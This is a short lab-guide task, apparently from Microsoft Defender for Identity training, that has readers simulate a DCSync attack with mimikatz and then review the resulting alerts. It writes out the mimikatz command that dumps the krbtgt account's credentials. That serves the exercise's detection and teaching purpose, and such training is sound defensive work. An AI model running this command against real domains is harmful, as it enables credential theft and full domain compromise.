### Task 1: Simulate and Detect Lateral Movement Attacks `(Read-Only)`

In this task, you will simulate a Lateral Movement attack and detect it using Microsoft Defender for Identity. Please note that this is a `read-only` task, as you will be logged out of your virtual machine during the attack simulationâ€”this is a security measure enforced by Defender for Identity.

1. Open **PowerShell (Admin)** and navigate to the below-mentioned directory.

      ```powershell
      cd C:\MimikatzLab\mimikatz-master\mimikatz-master\x64
      ```
1. In the same PowerShell session, run the below command to run the mimikatz application

     ```powershell
     mimikatz.exe 
     ```

1. Simulate a DC Sync attack and extract the credentials of the krbtgt account.

      ```shell
      lsadump::dcsync /domain:yourdomain.com /user:krbtgt
      ```

1. Now you can check your alerts in the Microsoft Defender portal, navigate to **Incidents & alerts** in the left-hand navigation pane.

      > **Note:** The user will be logged out of the virtual machine as part of the containment measures initiated by the Defender in response to the user's attempted lateral movement attack.
